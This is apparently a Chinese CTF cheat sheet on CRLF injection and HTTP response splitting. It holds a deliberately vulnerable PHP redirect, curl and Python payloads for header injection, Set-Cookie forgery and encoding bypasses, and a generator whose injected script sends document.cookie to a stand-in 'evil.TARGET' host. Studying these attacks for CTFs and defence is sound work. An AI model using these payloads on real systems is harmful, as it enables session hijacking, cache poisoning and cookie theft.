---
title: CRLF 注入与 HTTP 响应拆分（Header 注入、Set-Cookie 劫持）
category: web
tags: [crlf, response-splitting, header-injection, http2, cookie]
signals:
  - "跳转参数形如 ?url=/success，且 Location 头跟着用户输入变"
  - "用户名或上传文件名被回显进响应头"
  - "响应里出现 Set-Cookie，且其值来自用户输入"
  - "提交 %0d%0a 之后响应多出一个自定义头"
  - "Nginx 版本较老，PHP 用 header() 拼接 $_GET"
  - "有下载接口 filename= 参数直接进 Content-Disposition"
  - "题面提示词出现 换行 / 响应拆分 / CRLF / header injection"
  - "分享链接参数直接写进 Refresh 或 Location"
  - "过滤了 %0a 却漏掉了 %0d，或反过来"
difficulty: medium
source: "PortSwigger / HackTricks"
tools: [burpsuite, python, curl]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 跳转逻辑：`?next=/home` 直接写进 `Location:` 头。
- 上传后的文件名、用户名、语言参数被放进 `Content-Disposition` 或自定义头。
- 提交 `%0d%0a` 后，响应里多出一个 `Set-Cookie` 或整个 body 被改写。
- 有"下载"接口 `?file=report.pdf`，返回 `Content-Disposition: attachment; filename=report.pdf`。
- 题面提示词：`CRLF`、`换行`、`响应拆分`、`response splitting`、`header injection`。
- 存在 HTTP/2 端点（H2 允许 header 值里有 `\r\n` 被"合法化"），后端仍是 HTTP/1.1。
- 输入里 `%0a` 被过滤但 `%0d` 没被过滤（或反过来）。

## 二、原理

### 1. 本质

HTTP/1.1 的 header 用 `\r\n`（CRLF）分隔。如果用户输入未经清洗被拼进 header 值，注入 `\r\n` 就能**新增 header**；注入 `\r\n\r\n` 就能**提前结束响应头**，把后续内容写进 body。

```http
GET /redirect?url=/home%0d%0aSet-Cookie:%20admin=1 HTTP/1.1
```

服务端：

```php
header("Location: " . $_GET['url']);   // ← 拼接注入
```

响应：

```http
HTTP/1.1 302 Found
Location: /home
Set-Cookie: admin=1          ← 新注入的 header
```

### 2. 三种层级的影响

| 注入位置 | 后果 |
|---|---|
| **只注入 `\r\n`（加 header）** | 伪造 `Set-Cookie`、`Content-Security-Policy`、`X-XSS-Protection: 0` |
| **注入 `\r\n\r\n`（拆分响应）** | 在 body 前插入完整第二个 HTTP 响应 → 缓存投毒 / XSS |
| **注入到 Cookie/`Set-Cookie`** | 劫持会话、注入 `Domain=.target` 让子域共享 |

### 3. HTTP/2 场景（H2.CRLF）

HTTP/2 的 header 是二进制，`\r\n` **不在协议层被禁止**（RFC 9113 说 `\r`/`\n` 在字段值里应当拒绝，但很多实现在**降级到 HTTP/1.1** 时才处理）。因此：

```
:path: /%0d%0aSet-Cookie:%20admin=1
```

前端（CDN）放行，回源时拼进 H1 请求 → 后端把它当新 header。

### 4. 常见注入点

- `Location`（302 跳转、`next=`/`url=`/`redirect=`）
- `Set-Cookie`（登录后记住用户名）
- `Content-Disposition`（下载文件名）
- `Refresh`、`Link`、`X-Forwarded-*`（回显到响应）
- **请求侧**：`X-Forwarded-For` 注入 `\r\n` → 内部服务拼接日志/头

## 三、解题步骤

1. **找反射头**：拿到的每个响应头，逐个对照请求参数，看有没有"用户输入 → 头值"的直通车。
2. **最小验证**：`?next=/a%0d%0aX-Test:%20123`，看响应里是否多出 `X-Test: 123`。
3. **编码绕过**：`%0a`、`%0A`、`%0d`、`%0D`、`\r\n`、双重编码 `%250a`、`%E5%98%8A%E5%98%8D`（UTF-8 的 U+560A U+560D 被某些服务端截成 CR LF）。
4. **落 Set-Cookie**：`?next=/a%0d%0aSet-Cookie:%20admin=1;%20path=/`。
5. **响应拆分**：构造 `\r\n\r\nHTTP/1.1 200 OK...` 完整第二个响应，看缓存是否被投毒。
6. **H2**：Burp 里把 `:path` 改成带 `\r\n` 的形式，切到 HTTP/2 发送。
7. **CTF 收尾**：伪造 admin cookie 直接访问后台，或注入 JS 窃取 flag。

## 四、可直接运行的脚本

最小复现靶（PHP）：

```php
<?php
// redirect.php —— 漏洞点：直接把参数拼进 header
$next = $_GET['next'] ?? '/';
header("Location: " . $next);   // 未过滤 \r\n
```

本地验证：

```bash
# 1) 简单 header 注入
curl -si 'http://127.0.0.1/redirect.php?next=/a%0d%0aX-Test:%20123' | head -10

# 2) 注入 Set-Cookie
curl -si 'http://127.0.0.1/redirect.php?next=/a%0d%0aSet-Cookie:%20admin=1;%20path=/' | head -10

# 3) 响应拆分（伪造第二个响应）
curl -si 'http://127.0.0.1/redirect.php?next=/a%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>' | head -30
```

批量探测脚本：

```python
import requests

URL = "http://TARGET/redirect"
PAYLOADS = [
    "%0d%0aX-Test: 123",
    "%0aX-Test: 123",                     # 只注入 LF
    "%0D%0AX-Test: 123",                  # 大写
    "%250d%250aX-Test: 123",              # 双重编码
    "%E5%98%8A%E5%98%8DX-Test: 123",      # U+560A/U+560D
    "%0d%0aSet-Cookie: admin=1; path=/",
    "%0d%0a%0d%0aBODY-SPLIT",             # 拆分响应
]

for p in PAYLOADS:
    try:
        r = requests.get(URL, params={"next": "/a" + p},
                         allow_redirects=False, timeout=10)
    except Exception as e:
        print("ERR", p, e); continue
    hit = "x-test" in {k.lower() for k in r.headers} or "admin=1" in r.headers.get("Set-Cookie", "")
    print("HIT " if hit else "    ", p, r.status_code, dict(r.headers).get("Set-Cookie"))
```

造完整拆分响应的 payload 生成器：

```python
from urllib.parse import quote

body = "<script>fetch('//evil.TARGET/'+document.cookie)</script>"
split = (
    "HTTP/1.1 200 OK\r\n"
    "Content-Type: text/html\r\n"
    "Content-Length: %d\r\n\r\n%s" % (len(body), body)
)
inj = "/a\r\nContent-Length: 0\r\n\r\n" + split
print(quote(inj, safe=""))
```

## 五、常见坑 / 变体

- **PHP `header()` 自动拒绝 `\r\n`**（PHP 5.1.2+ 抛 warning）→ 这只是"默认安全"，用 `\r`（仅 CR）或 `\n`（仅 LF）可能仍有效。
- **Nginx 反代会规范化**：`\r\n` 在 `Location` 里被转义为 `%0D%0A` → 需要 TLS/原始接口。
- **Node.js `res.setHeader` 会抛错**，但 `res.writeHead(rawHeaders)` 不做检查。
- **变体：在 `Content-Disposition` 注入 `filename="...\r\n..."`** → 配合 IE/旧浏览器下载执行。
- **变体：`X-Forwarded-For` 注入 → 绕过 IP 白名单**（有些框架把整个头拼进 `REMOTE_ADDR`）。
- **变体：SMTP 头注入**（注册邮件 `to` 参数带 `\r\nBcc:`）→ 垃圾邮件。
- **变体：H2 → H1 降级**（Burp 里 `:path` 注入），见 `http-request-smuggling.md`。
- **变体：响应拆分 → 缓存投毒**（把伪造响应写进 CDN），见 `web-cache-poisoning-deception.md`。
- **CTF 常见考法**：伪造 `Set-Cookie: role=admin`，直接访问后台拿 flag。
- **U+560A/U+560D 原理**：`\xe5\x98\x8a` 在 GBK 下低字节 `\x0a` 被当 LF，`\xe5\x98\x8d` 同理得 `\x0d`，可用于绕过只过滤 `\r\n` 的 WAF。

## 六、参考来源

- [PortSwigger — HTTP Host header attacks](https://portswigger.net/web-security/host-header)
- [PortSwigger Lab — HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
- [HackTricks — CRLF injection](https://book.hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html)
- [OWASP — HTTP Response Splitting](https://community.owasp.org/attacks/HTTP_Response_Splitting)
- [RFC 9110 — HTTP Semantics](https://www.rfc-editor.org/rfc/rfc9110)
- [RFC 9113 — HTTP/2](https://www.rfc-editor.org/rfc/rfc9113)
